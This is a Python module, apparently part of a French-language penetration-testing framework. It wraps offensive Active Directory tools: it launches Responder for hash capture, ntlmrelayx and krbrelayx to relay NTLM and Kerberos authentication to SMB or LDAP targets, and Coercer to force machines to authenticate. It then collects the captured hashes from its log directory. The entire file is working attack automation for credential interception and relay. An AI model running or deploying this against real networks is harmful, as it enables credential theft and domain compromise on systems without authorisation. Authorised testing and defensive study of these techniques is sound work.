# modules/responder.py
from utils import run_cmd
import os

class ResponderModule:
    def __init__(self):
        self.interface = "eth0"
        self.output_dir = "logs"

    def start_responder(self, interface=None, analyze=False):
        """Démarre Responder pour la capture de hash"""
        if interface:
            self.interface = interface
            
        cmd = ["responder", "-I", self.interface]
        if analyze:
            cmd.append("-A")  # Mode Analyze
            
        print(f"[*] Démarrage de Responder sur {self.interface}")
        return run_cmd(cmd)

    def start_relay(self, target, protocol="smb"):
        """Configure et démarre ntlmrelayx"""
        cmd = ["ntlmrelayx.py", "-tf", "targets.txt"]
        
        if protocol == "smb":
            cmd.extend(["-smb2support"])
        elif protocol == "ldap":
            cmd.extend(["-wh", "fake", "-t", f"ldap://{target}"])
            
        print(f"[*] Démarrage du relay vers {target}")
        return run_cmd(cmd)

    def start_krbrelay(self, target):
        """Démarre krbrelay pour le relaying Kerberos"""
        cmd = ["krbrelayx.py", "-t", f"ldap://{target}"]
        return run_cmd(cmd)

    def start_coercer(self, target):
        """Utilise Coercer pour forcer l'authentification"""
        cmd = ["coercer", "scan", target]
        return run_cmd(cmd)

    def analyze_hashes(self):
        """Analyse les hashes capturés dans les logs"""
        if not os.path.exists(self.output_dir):
            return "Aucun log trouvé"
            
        hashes = []
        for file in os.listdir(self.output_dir):
            if file.endswith(".txt"):
                with open(os.path.join(self.output_dir, file)) as f:
                    hashes.extend(f.readlines())
        return hashes 